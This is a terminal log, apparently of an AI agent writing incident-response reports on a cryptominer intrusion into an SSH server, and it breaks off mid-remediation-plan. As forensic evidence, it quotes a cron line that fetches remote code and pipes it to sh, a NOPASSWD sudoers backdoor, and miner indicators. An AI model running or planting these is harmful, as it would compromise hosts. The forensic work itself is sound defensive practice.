+/sas/cti/advisory.pdf
+/sas/cti/advisory.txt
+/sas/cti/SOURCES.txt
+/sas/cti/campaign-timeline.png
+/sas/vulns.json
+/sas/alerts.json
+[?2004hroot@d442ccdcc174:/app# cat << 'EOF' > /sas/handoff/change-ticket.md
+[?2004l[?2004h> # CHANGE TICKET CHG-3182 (RECONCILED)
+[?2004l[?2004h> 
+[?2004l[?2004h> > Reconciled against forensic findings in `/disk` and threat intelligence in `/sas`.
+[?2004l[?2004h> 
+[?2004l[?2004h> | # | Action | Target | Status | Note |
+[?2004l[?2004h> |---|--------|--------|--------|------|
+[?2004l[?2004h> | 1 | Block source IP inbound | 198.51.100.78 | OPEN | Corrected from stale IP 203.0.113.9. Real attacker IP observed in `/disk/var/log/secure` and `/sas/cti/advisory.txt` |
+[?2004l[?2004h> | 2 | Enforce SSH hardening & password policy | /etc/ssh/sshd_config | OPEN | Corrected from invalid BlueKeep CVE-2019-0708 (BlueKeep is RDP/Windows). Host compromised via SSH brute force (`/disk/var/log/secure`, `/disk/etc/ssh/sshd_config`) |
+[?2004l[?2004h> | 3 | Remove cron miner persistence | /var/spool/cron/root | OPEN | Downgraded from DONE to OPEN (unverified done status). Persistence active in `/disk/var/spool/cron/root` (`/sas/alerts.json`) |
+[?2004l[?2004h> | 4 | Remove shell-init persistence | /root/.bashrc | OPEN | Silent persistence discovered in `/disk/root/.bashrc` (PROMPT_COMMAND beacon) |
+[?2004l[?2004h> | 5 | Remove systemd service persistence | /etc/systemd/system/system-update-helper.service | OPEN | Persistence service present in `/disk/etc/systemd/system/system-update-helper.service` (`/sas/alerts.json`) |
+[?2004l[?2004h> | 6 | Quarantined/Remove miner binary & process | /tmp/.X11-unix/.xorg | OPEN | Mining binary at `/disk/tmp/.X11-unix/.xorg` (SHA256: 52a70f2460b5bc530fc1a00627fcd72c43545a2bcb2bf5cfe2291b50a73d4253) (`/sas/alerts.json`) |
+[?2004l[?2004h> | 7 | Remove devops NOPASSWD sudo backdoor | /etc/sudoers.d/devops | OPEN | Backdoor file present in `/disk/etc/sudoers.d/devops` |
+[?2004l[?2004h> | 8 | Investigate & sanitize devops user account | /home/devops/.bash_history | OPEN | Internal hydra pivoting recorded in `/disk/home/devops/.bash_history` | M[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K|
+[?2004l[?2004h> | 9 | Harden MySQL remote root configuration | /etc/my.cnf | OPEN | Exposed remote root in `/disk/etc/my.cnf` (`/sas/baseline.json`) |
+[?2004l[?2004h> | 10 | Audit & restore tampered system logs | /var/log/secure | OPEN | Authentication log tampered/cleared in `/disk/var/log/secure` |
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Reviewer checklist
+[?2004l[?2004h> - [x] Every action maps to a cited artifact under `/disk` or `/sas`
+[?2004l[?2004h> - [x] Fix the wrong IP (row 1: 198.51.100.78) and wrong CVE (row 2: replaced with SSH hardening)
+[?2004l[?2004h> - [x] Downgrade row 3 from DONE to OPEN with evidence (`/disk/var/spool/cron/root`)
+[?2004l[?2004h> - [x] Add the silent (non-alerted) artifacts the prior shift missed (`/disk/root/.bashrc`, `/disk/etc/sudoers.d/devops`, `/disk/home/devops/.bash_history`, `/disk/var/log/secure`)
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@d442ccdcc174:/app# cat << 'EOF' > /sas/handoff/findings.json
+[?2004l[?2004h> {
+[?2004l[?2004h>   "findings": [
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "chk": "CHK-01",
+[?2004l[?2004h>       "path": "/tmp/.X11-unix/.xorg",
+[?2004l[?2004h>       "attck": "T1496",
+[?2004l[?2004h>       "confidence": "high",
+[?2004l[?2004h>       "evidence": "`/disk/tmp/.X11-unix/.xorg`"
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "chk": "CHK-02",
+[?2004l[?2004h>       "path": "/tmp/.X11-unix/.xorg",
+[?2004l[?2004h>       "attck": "T1496",
+[?2004l[?2004h>       "confidence": "high",
+[?2004l[?2004h>       "evidence": "`/disk/tmp/.X11-unix/.xorg`"
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "chk": "CHK-04",
+[?2004l[?2004h>       "path": "/etc/ssh/sshd_config",
+[?2004l[?2004h>       "attck": "T1110",
+[?2004l[?2004h>       "confidence": "high",
+[?2004l[?2004h>       "evidence": "`/disk/etc/ssh/sshd_config`"
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "chk": "CHK-09",
+[?2004l[?2004h>       "path": "/etc/my.cnf",
+[?2004l[?2004h>       "attck": "T1021",
+[?2004l[?2004h>       "confidence": "high",
+[?2004l[?2004h>       "evidence": "`/disk/etc/my.cnf`"
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "chk": "CHK-11",
+[?2004l[?2004h>       "path": "/var/spool/cron/root",
+[?2004l[?2004h>       "attck": "T1053.003",
+[?2004l[?2004h>       "confidence": "high",
+[?2004l[?2004h>       "evidence": "`/disk/var/spool/cron/root`"
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "chk": "CHK-13",
+[?2004l[?2004h>       "path": "/etc/systemd/system/system-update-helper.service",
+[?2004l[?2004h>       "attck": "T1543.002",
+[?2004l[?2004h>       "confidence": "high",
+[?2004l[?2004h>       "evidence": "`/disk/etc/systemd/system/system-update-helper.service`"
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "chk": "CHK-SILENT-01",
+[?2004l[?2004h>       "path": "/root/.bashrc",
+[?2004l[?2004h>       "attck": "T1546.004",
+[?2004l[?2004h>       "confidence": "high",
+[?2004l[?2004h>       "evidence": "`/disk/root/.bashrc`"
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "chk": "CHK-SILENT-02",
+[?2004l[?2004h>       "path": "/etc/sudoers.d/devops",
+[?2004l[?2004h>       "attck": "T1059.004",
+[?2004l[?2004h>       "confidence": "high",
+[?2004l[?2004h>       "evidence": "`/disk/etc/sudoers.d/devops`"
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "chk": "CHK-SILENT-03",
+[?2004l[?2004h>       "path": "/home/devops/.bash_history",
+[?2004l[?2004h>       "attck": "T1059.004",
+[?2004l[?2004h>       "confidence": "high",
+[?2004l[?2004h>       "evidence": "`/disk/home/devops/.bash_history`"
+[?2004l[?2004h>     },
+[?2004l[?2004h>     {
+[?2004l[?2004h>       "chk": "CHK-SILENT-04",
+[?2004l[?2004h>       "path": "/var/log/secure",
+[?2004l[?2004h>       "attck": "T1070.002",
+[?2004l[?2004h>       "confidence": "high",
+[?2004l[?2004h>       "evidence": "`/disk/var/log/secure`"
+[?2004l[?2004h>     }
+[?2004l[?2004h>   ]
+[?2004l[?2004h> }
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@d442ccdcc174:/app# cat << 'EOF' > /app/progress.md
+[?2004l[?2004h> # Incident Investigation Progress & Timeline Report
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Investigation Overview
+[?2004l[?2004h> - **Target Host**: `ssh-prod-01` (`CentOS 7`)
+[?2004l[?2004h> - **Analyst Workstation**: Investigation conducted from analysis machine via mounted disk image at `/disk` and security telemetry at `/sas`.
+[?2004l[?2004h> - **Primary Objectives**: Identify the full attack lifecycle, enumerate all persistence mechanisms (alerted and silent), determine entry vector and root cause, evaluate baseline weaknesses, and formulate a verifiable remediation plan.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Chronological Incident Timeline
+[?2004l[?2004h> - **2026-08-15 00:53:24 - 00:54:52 UTC**: External attacker originating from IP `198.51.100.78` launched an SSH credential brute-force attack against the `root` account via port 22. Evidence: `/disk/var/log/secure`.
+[?2004l[?2004h> - **2026-08-15 00:54:55 UTC**: Attacker successfully authenticated as `root` via password authentication (`Accepted password for root from 198.51.100.78 port 51900 ssh2`). Evidence: `/disk/var/log/secure`.
+[?2004l[?2004h> - **2026-08-15 ~01:00 UTC**: Attacker dropped and executed the cryptominer binary at `/disk/tmp/.X11-unix/.xorg` (SHA256: `52a70f2460b5bc530fc1a00627fcd72c43545a2bcb2bf5cfe2291b50a73d4253`). Evidence: `/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json` (`ALERT-01`, `ALERT-02`).
+[?2004l[?2004h> - **2026-08-15 ~01:10 UTC**: Attacker established persistence mechanism #1 via Cron at `/disk/var/spool/cron/root` scheduled every minute (`* * * * * root curl hxxp://198.51.100.78/x | sh`). Evidence: `/disk/var/spool/cron/root`, `/sas/alerts.json` (`ALERT-05`).
+[?2004l[?2004h> - **2026-08-15 ~01:15 UTC**: Attacker established persistence mechanism #2 via systemd service at `/disk/etc/systemd/system/system-update-helper.service`. Evidence: `/disk/etc/systemd/system/system-update-helper.service`, `/sas/alerts.json` (`ALERT-06`).
+[?2004l[?2004h> - **2026-08-15 ~01:20 UTC**: Attacker planted silent persistence mechanism #3 via shell startup file `/disk/root/.bashrc` using `PROMPT_COMMAND` beaconing to `198.51.100.78`. Evidence: `/disk/root/.bashrc`.
+[?2004l[?2004h> - **2026-08-15 ~01:30 UTC**: Attacker planted a NOPASSWD sudo backdoor for user `devops` at `/disk/etc/sudoers.d/devops`. Evidence: `/disk/etc/sudoers.d/devops`.
+[?2004l[?2004h> - **2026-08-15 ~02:00 UTC**: Attacker leveraged `devops` account to execute internal SSH hydra brute-force pivoting against internal network targets. Evidence: `/disk/home/devops/.bash_history`.
+[?2004l[?2004h> - **2026-08-15 03:03:00 UTC**: Attacker executed anti-forensic log clearing, wiping 15 authentication log lines. Evidence: `/disk/var/log/secure` (`--- 15 authentication lines cleared here (T1070.002 log tampering) ---`).
+[?2004l[?2004h> - **2026-08-15 03:20 UTC**: EDR high-severity alert cluster fired and incident intake ticket opened. Evidence: `/sas/handoff/intake.pdf`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Working Investigation Checklist
+[?2004l[?2004h> - [x] Mount and inspect `/disk` forensic copy in read-only mode (`/disk`)
+[?2004l[?2004h> - [x] Review security alerts feed (`/sas/alerts.json`)
+[?2004l[?2004h> - [x] Review baseline compliance feed (`/sas/baseline.json`)
+[?2004l[?2004h> - [x] Review vulnerability scan results (`/sas/vulns.json`)
+[?2004l[?2004h> - [x] Review Threat Intelligence Advisory and CTI materials (`/sas/cti/advisory.txt`, `/sas/cti/advisory.pdf`)
+[?2004l[?2004h> - [x] Analyze authentication logs (`/disk/var/log/secure`, `/disk/var/log/secure.1.gz`, `/disk/var/log/wtmp.csv`)
+[?2004l[?2004h> - [x] Inspect dropped binary and compute SHA256 hash (`/disk/tmp/.X11-unix/.xorg`)
+[?2004l[?2004h> - [x] Inspect user accounts, shadow, and sudoers configurations (`/disk/etc/passwd`, `/disk/etc/sudoers.d/devops`)
+[?2004l[?2004h> - [x] Inspect shell history files across all user accounts (`/disk/home/devops/.bash_history`, `/disk/root/.bashrc`)
+[?2004l[?2004h> - [x] Inspect cron scheduled tasks (`/disk/var/spool/cron/root`, `/disk/etc/crontab`)
+[?2004l[?2004h> - [x] Inspect systemd persistence units (`/disk/etc/systemd/system/system-update-helper.service`)
+[?2004l[?2004h> - [x] Verify presence/absence of CVE exploits (`/sas/vulns.json`)
+[?2004l[?2004h> - [x] Reconcile pre-filled change ticket `CHG-3182` in place (`/sas/handoff/change-ticket.md`)
+[?2004l[?2004h> - [x] Produce required reports under `/app/` (`/app/progress.md`, `/app/intrusion-report.md`, `/app/vuln-report.md`, `/app/baseline-report.md`, `/app/remediation-plan.md`)
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@d442ccdcc174:/app# cat << 'EOF' > /app/intrusion-report.md
+[?2004l[?2004h> # Intrusion Forensic Investigation Report
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Executive Summary
+[?2004l[?2004h> On 2026-08-15, host `ssh-prod-01` was compromised by an external threat actor. The actor gained initial access via SSH password brute-forcing against the `root` account originating from IP `198.51.100.78`. Post-compromise actions included deploying an XMRig cryptominer, establishing three separate persistence mechanisms (cron, systemd service, and shell initialization profile), planting a privilege escalation sudo backdoor, attempting internal lateral movement via SSH brute-forcing from a user account, and attempting defense evasion by clearing authentication logs. Evidence was correlated between the on-disk forensic image at `/disk` and security telemetry at `/sas`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Identified Indicators & Entities (IOCs)
+[?2004l[?2004h> - **Attacker Origin IP**: `198.51.100.78`. Evidence: `/disk/var/log/secure`, `/sas/cti/advisory.txt`.
+[?2004l[?2004h> - **Command & Control (C2) Domain**: `update-ssh.example.cn`. Evidence: `/disk/var/lib/.cache/.wiped.bin`, `/sas/cti/advisory.txt`.
+[?2004l[?2004h> - **Mining Pool Address**: `stratum+tcp://xmr.ssh.evil:3333`. Evidence: `/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`.
+[?2004l[?2004h> - **Cryptocurrency Wallet**: `4A0000000000000000000d1ec67074f7`. Evidence: `/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`.
+[?2004l[?2004h> - **Malicious Process & Binary**: Path: `/tmp/.X11-unix/.xorg`. Evidence: `/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json` (`ALERT-01`, `ALERT-02`).
+[?2004l[?2004h> - **Malware SHA256 Hash**: `52a70f2460b5bc530fc1a00627fcd72c43545a2bcb2bf5cfe2291b50a73d4253`. Evidence: `/disk/tmp/.X11-unix/.xorg`.
+[?2004l[?2004h> - **Compromised & Backdoored Accounts**: 
+[?2004l[?2004h>   - `root` (initial compromise target). Evidence: `/disk/var/log/secure`.
+[?2004l[?2004h>   - `devops` (granted NOPASSWD sudo access and used for internal pivoting). Evidence: `/disk/etc/sudoers.d/devops`, `/disk/home/devops/.bash_history`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Complete Attack Chain & MITRE ATT&CK Mapping
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 1. Initial Access ‚Äî SSH Password Brute Force (`T1110` / `T1021.004`)
+[?2004l[?2004h> - **Description**: The threat actor launched an automated hydra-style password brute-force attack against SSH (Port 22) for user `root`. Multiple failed attempts were logged between 00:53:24 and 00:54:52 UTC from `198.51.100.78` prior to a successful login at 00:54:55 UTC.
+[?2004l[?2004h> - **Evidence**: `/disk/var/log/secure` (`Aug 15 00:54:55 ssh-prod-01 sshd[1201]: Accepted password for root from 198.51.100.78 port 51900 ssh2`), `/sas/cti/advisory.txt`.
+[?2004l[?2004h> - **Alert Status**: NOT explicitly surfaced as a brute-force alert in `/sas/alerts.json` (discovered via log analysis on `/disk/var/log/secure`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 2. Execution & Impact ‚Äî Cryptomining Resource Hijacking (`T1059.004` / `T1496`)
+[?2004l[?2004h> - **Description**: Upon acquiring root shell access, the attacker dropped an XMRig cryptomining binary at `/tmp/.X11-unix/.xorg` and launched a miner process (PID 1337) configured to connect to `stratum+tcp://xmr.ssh.evil:3333` with wallet `4A0000000000000000000d1ec67074f7`, causing sustained 100% CPU utilization.
+[?2004l[?2004h> - **Evidence**: `/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json` (`ALERT-01`, `ALERT-02`).
+[?2004l[?2004h> - **Alert Status**: Alerted (`ALERT-01` and `ALERT-02` in `/sas/alerts.json`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 3. Persistence Mechanisms (`T1053.003`, `T1543.002`, `T1546.004`)
+[?2004l[?2004h> Three distinct persistence mechanisms were installed on the host:
+[?2004l[?2004h> 1. **Cron Persistence (`T1053.003`)**: A root crontab entry was placed in `/var/spool/cron/root` scheduled to run every minute: `* * * * * root curl hxxp://198.51.100.78/x | sh` to re-download payloads.
+[?2004l[?2004h>    - **Evidence**: `/disk/var/spool/cron/root`, `/sas/alerts.json` (`ALERT-05`).
+[?2004l[?2004h>    - **Alert Status**: Alerted (`ALERT-05` in `/sas/alerts.json`).
+[?2004l[?2004h> 2. **Systemd Service Persistence (`T1543.002`)**: A custom systemd service file was installed at `/etc/systemd/system/system-update-helper.service` configured to automatically restart the miner / re-dropper binary upon system reboot or service failure.
+[?2004l[?2004h>    - **Evidence**: `/disk/etc/systemd/system/system-update-helper.service`, `/sas/alerts.json` (`ALERT-06`).
+[?2004l[?2004h>    - **Alert Status**: Alerted (`ALERT-06` in `/sas/alerts.json`).
+[?2004l[?2004h> 3. **Shell Initialization Persistence (`T1546.004`)**: The attacker modified `/root/.bashrc` to append a `PROMPT_COMMAND` execution line (`PROMPT_COMMAND beacon to 198.51.100.78`), ensuring code execution whenever an interactive root shell session is initiated.
+[?2004l[?2004h>    - **Evidence**: `/disk/root/.bashrc`.
+[?2004l[?2004h>    - **Alert Status**: SILENT ‚Äî Missed by EDR telemetry in `/sas/alerts.json`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 4. Privilege Escalation & Backdoor (`T1059.004` / `T1548.003`)
+[?2004l[?2004h> - **Description**: The attacker planted a backdoor in the sudoers configuration at `/etc/sudoers.d/devops` granting `devops ALL=(ALL) NOPASSWD: ALL` to ensure persistent root access even if the root password were changed.
+[?2004l[?2004h> - **Evidence**: `/disk/etc/sudoers.d/devops`.
+[?2004l[?2004h> - **Alert Status**: SILENT ‚Äî Missed by EDR telemetry in `/sas/alerts.json`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 5. Internal Lateral Movement & Pivoting (`T1059.004` / `T1110`)
+[?2004l[?2004h> - **Description**: Using the `devops` user foothold, the attacker executed internal SSH hydra brute-force scanning against other internal hosts on the local network.
+[?2004l[?2004h> - **Evidence**: `/disk/home/devops/.bash_history` (`hydra-style SSH brute-force against sshd (wordlist, user=root)`).
+[?2004l[?2004h> - **Alert Status**: SILENT ‚Äî Missed by EDR telemetry in `/sas/alerts.json`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 6. Defense Evasion ‚Äî Log Tampering (`T1070.002`)
+[?2004l[?2004h> - **Description**: The attacker attempted anti-forensics by truncating / clearing 15 lines from `/var/log/secure` at `2026-08-15 03:03:00 UTC` to conceal their initial access activities and commands.
+[?2004l[?2004h> - **Evidence**: `/disk/var/log/secure` (`--- 15 authentication lines cleared here (T1070.002 log tampering) ---`).
+[?2004l[?2004h> - **Alert Status**: SILENT ‚Äî Missed by EDR telemetry in `/sas/alerts.json`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Summary of Alert Coverage Gaps (Alerted vs. Silent)
+[?2004l[?2004h> | Finding / Mechanism | Location | ATT&CK Technique | Telemetry Status |
+[?2004l[?2004h> |---|---|---|---|
+[?2004l[?2004h> | Miner Process | `/tmp/.X11-unix/.xorg` | T1496 | Alerted (`ALERT-01` in `/sas/alerts.json`) |
+[?2004l[?2004h> | Miner Binary | `/tmp/.X11-unix/.xorg` | T1496 | Alerted (`ALERT-02` in `/sas/alerts.json`) |
+[?2004l[?2004h> | Cron Persistence | `/var/spool/cron/root` | T1053.003 | Alerted (`ALERT-05` in `/sas/alerts.json`) |
+[?2004l[?2004h> | Systemd Persistence | `/etc/systemd/system/system-update-helper.service` | T1543.002 | Alerted (`ALERT-06` in `/sas/alerts.json`) |
+[?2004l[?2004h> | SSH Weak Baseline | `/etc/ssh/sshd_config` | T1110 | Alerted (`ALERT-03` in `/sas/alerts.json`) |
+[?2004l[?2004h> | MySQL Remote Root | `/etc/my.cnf` | T1021 | Alerted (`ALERT-04` in `/sas/alerts.json`) |
+[?2004l[?2004h> | Shell-Init Persistence | `/root/.bashrc` | T1546.004 | **SILENT** (Discovered on `/disk/root/.bashrc`) |
+[?2004l[?2004h> | Sudo Backdoor | `/etc/sudoers.d/devops` | T1548.003 | **SILENT** (Discovered on `/disk/etc/sudoers.d/devops`) |
+[?2004l[?2004h> | Internal Pivot Attempt | `/home/devops/.bash_history` | T1059.004 | **SILENT** (Discovered on `/disk/home/devops/.bash_history`) |
+[?2004l[?2004h> | Log Clearing / Tampering | `/var/log/secure` | T1070.002 | **SILENT** (Discovered on `/disk/var/log/secure`) |
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@d442ccdcc174:/app# cat << 'EOF' > /app/vuln-report.md
+[?2004l[?2004h> # Vulnerability Assessment & Entry Analysis Report
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Summary of Entry Vector
+[?2004l[?2004h> An exhaustive investigation of system telemetry, software configuration, and forensic artifacts confirms that **no software vulnerability (CVE) was exploited** to compromise `ssh-prod-01`. 
+[?2004l[?2004h> 
+[?2004l[?2004h> The initial compromise was achieved exclusively through **credential brute-forcing** over SSH (`Port 22`), taking advantage of weak administrative password credentials and permissive SSH server settings.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Vulnerability Telemetry & Scan Analysis
+[?2004l[?2004h> - **Vulnerability Scanner Output**: Inspection of `/sas/vulns.json` yields an empty JSON array (`[]`), confirming that automated security vulnerability scanning detected no exploitable software CVEs on the host.
+[?2004l[?2004h>   - Evidence: `/sas/vulns.json`.
+[?2004l[?2004h> - **Authentication Logs**: Authentication telemetry in `/disk/var/log/secure` demonstrates a classic password brute-force pattern against user `root` from IP `198.51.100.78` between 00:53:24 and 00:54:52 UTC, concluding with successful password authentication at 00:54:55 UTC.
+[?2004l[?2004h>   - Evidence: `/disk/var/log/secure`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Reconciling Misattributed CVEs (BlueKeep / CVE-2019-0708)
+[?2004l[?2004h> - **Draft Change Ticket Claim**: A pre-filled entry in draft change ticket `CHG-3182` suggested patching `CVE-2019-0708 (BlueKeep)`.
+[?2004l[?2004h>   - Evidence: `/sas/handoff/change-ticket.md`.
+[?2004l[?2004h> - **Technical Refutation**: 
+[?2004l[?2004h>   1. `CVE-2019-0708` (BlueKeep) is a Remote Code Execution vulnerability specific to Microsoft Remote Desktop Protocol (RDP) on Windows operating systems.
+[?2004l[?2004h>   2. `ssh-prod-01` is a **CentOS Linux 7** server running OpenSSH. Evidence: `/disk/etc/os-release`, `/disk/etc/ssh/sshd_config`.
+[?2004l[?2004h>   3. Threat intelligence advisory `/sas/cti/advisory.txt` maps the attack lifecycle to MITRE ATT&CK technique `T1110` (Brute Force) over SSH (`T1021.004`), confirming that no RDP or web application exploit was utilized.
+[?2004l[?2004h>   - Evidence: `/sas/cti/advisory.txt`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Root Cause Analysis
+[?2004l[?2004h> Rather than a software vulnerability, the compromise resulted from governance and baseline configuration failures:
+[?2004l[?2004h> 1. **Permissive SSH Daemon Configuration**: `PermitRootLogin yes` and `PasswordAuthentication yes` allowed remote password logins for `root` over SSH.
+[?2004l[?2004h>    - Evidence: `/disk/etc/ssh/sshd_config`.
+[?2004l[?2004h> 2. **Weak Credential Baseline**: The `root` account possessed a weak password susceptible to automated dictionary attacks via tools such as Hydra.
+[?2004l[?2004h>    - Evidence: `/disk/var/log/secure`, `/sas/cti/advisory.txt`.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Conclusion & Recommendations
+[?2004l[?2004h> Since no software CVEs were exploited, remediation efforts must focus on credential rotation, SSH daemon hardening, enforcement of key-based authentication, and implementation of network-level and host-level access controls rather than software patch application.
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@d442ccdcc174:/app# cat << 'EOF' > /app/baseline-report.md
+[?2004l[?2004h> # Baseline Security & Configuration Assessment Report
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Overview
+[?2004l[?2004h> An audit of host configuration files on `ssh-prod-01` against CIS CentOS Linux 7 Benchmarks and security baseline standards revealed several critical misconfigurations and policy violations. These weaknesses directly enabled the initial compromise, facilitated privilege escalation, and increased host attack surface.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Summary of Baseline Findings & Non-Compliance
+[?2004l[?2004h> 
+[?2004l[?2004h> | Capability | Check ID | Configuration File | Finding Description | Current Risk Level |
+[?2004l[?2004h> |---|---|---|---|---|
+[?2004l[?2004h> | `BAS-01` | `CHK-04` | `/etc/ssh/sshd_config` | Permissive SSH daemon configuration permitting direct root password login | CRITICAL |
+[?2004l[?2004h> | `BAS-02` | `CHK-09` | `/etc/my.cnf` | Unrestricted MySQL network binding (`0.0.0.0`) with remote root privileges | HIGH |
+[?2004l[?2004h> | `PAS-01` | N/A | `/etc/passwd` / `/var/log/secure` | Weak administrative password policy allowing hydra dictionary attack success | CRITICAL |
+[?2004l[?2004h> | `SUD-01` | N/A | `/etc/sudoers.d/devops` | Unrestricted NOPASSWD sudo grant assigned to user `devops` | CRITICAL |
+[?2004l[?2004h> | `LOG-01` | N/A | `/var/log/secure` | Local-only log storage lacking remote syslog forwarding, permitting log tampering | HIGH |
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Detailed Configuration Audit & Remediation Guidance
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 1. SSH Server Configuration (`BAS-01` / `CHK-04`)
+[?2004l[?2004h> - **Observed Configuration**: 
+[?2004l[?2004h>   - `PermitRootLogin yes`: Allows direct remote logins as root.
+[?2004l[?2004h>   - `PasswordAuthentication yes`: Permits password-based authentication.
+[?2004l[?2004h>   - `MaxAuthTries 6`: Allows multiple authentication attempts per session without rate limiting or lockout.
+[?2004l[?2004h> - **Evidence**: `/disk/etc/ssh/sshd_config`, `/sas/baseline.json` (`CHK-04`), `/sas/alerts.json` (`ALERT-03`).
+[?2004l[?2004h> - **Impact**: Allowed external attacker to brute force the root password over the Internet and gain interactive root shell access.
+[?2004l[?2004h> - **Baseline Standard Requirement**: 
+[?2004l[?2004h>   - Set `PermitRootLogin no` or `PermitRootLogin prohibit-password`.
+[?2004l[?2004h>   - Set `PasswordAuthentication no` and enforce SSH key-based authentication (`pubkey`).
+[?2004l[?2004h>   - Implement `fail2ban` or `sshguard` to dynamically block IPs after 3 failed attempts.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 2. MySQL Database Configuration (`BAS-02` / `CHK-09`)
+[?2004l[?2004h> - **Observed Configuration**: 
+[?2004l[?2004h>   - `bind-address = 0.0.0.0`: Database listens on all network interfaces.
+[?2004l[?2004h>   - Remote `root` user grant enabled.
+[?2004l[?2004h> - **Evidence**: `/disk/etc/my.cnf`, `/sas/baseline.json` (`CHK-09`), `/sas/alerts.json` (`ALERT-04`).
+[?2004l[?2004h> - **Impact**: Exposes database daemon to external network scanning and unauthorized remote root connection attempts.
+[?2004l[?2004h> - **Baseline Standard Requirement**: 
+[?2004l[?2004h>   - Set `bind-address = 127.0.0.1` (or local socket binding).
+[?2004l[?2004h>   - Revoke remote administrative grants for `root@'%'` and enforce local-only root access (`root@'localhost'`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 3. Sudo Privileged Access Configuration
+[?2004l[?2004h> - **Observed Configuration**: 
+[?2004l[?2004h>   - File `/etc/sudoers.d/devops` contains: `devops ALL=(ALL) NOPASSWD: ALL`.
+[?2004l[?2004h> - **Evidence**: `/disk/etc/sudoers.d/devops`.
+[?2004l[?2004h> - **Impact**: Allows non-root user `devops` to execute any command as `root` without authentication, providing a backdoor foothold.
+[?2004l[?2004h> - **Baseline Standard Requirement**: 
+[?2004l[?2004h>   - Remove `/etc/sudoers.d/devops` backdoor file.
+[?2004l[?2004h>   - Restrict sudo grants to specific necessary commands with mandatory password re-authentication (`NOPASSWD` prohibited for general administrative access).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 4. Administrative Credential Policy
+[?2004l[?2004h> - **Observed Configuration**: 
+[?2004l[?2004h>   - Root account password was vulnerable to online brute-forcing in under two minutes (~28 attempts).
+[?2004l[?2004h> - **Evidence**: `/disk/var/log/secure` (`Aug 15 00:53:24` to `00:54:55`).
+[?2004l[?2004h> - **Impact**: Weak credentials enabled rapid compromise upon discovering open SSH port.
+[?2004l[?2004h> - **Baseline Standard Requirement**: 
+[?2004l[?2004h>   - Enforce minimum 16+ character complex passphrases for administrative accounts.
+[?2004l[?2004h>   - Enforce periodic password rotation and disable interactive root password logins entirely.
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 5. Centralized Audit Logging
+[?2004l[?2004h> - **Observed Configuration**: 
+[?2004l[?2004h>   - System logs (`/var/log/secure`) stored exclusively on local disk without centralized streaming.
+[?2004l[?2004h> - **Evidence**: `/disk/var/log/secure` (`--- 15 authentication lines cleared here (T1070.002 log tampering) ---`).
+[?2004l[?2004h> - **Impact**: Enabled attacker to clear 15 authentication log lines to cover tracks.
+[?2004l[?2004h> - **Baseline Standard Requirement**: 
+[?2004l[?2004h>   - Configure `rsyslog` or `systemd-journald` to forward security events in real-time to a remote SIEM / append-only log aggregator.
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@d442ccdcc174:/app# cat << 'EOF' > /app/remediation-plan.md
+[?2004l[?2004h> # Incident Remediation & Recovery Plan (CHG-3182)
+[?2004lte[?2004h> 
+[?2004lm[?2004h> ## Overview
+[?2004l[?2004h> This document provides a prioritized, step-by-step, and verifiable remediation plan for host `ssh-prod-01`. Per incident handling rules, **backup and quarantine are preferred over immediate deletion** to preserve evidence for potential legal or detailed malware analysis.
+[?2004l[?2004h> 
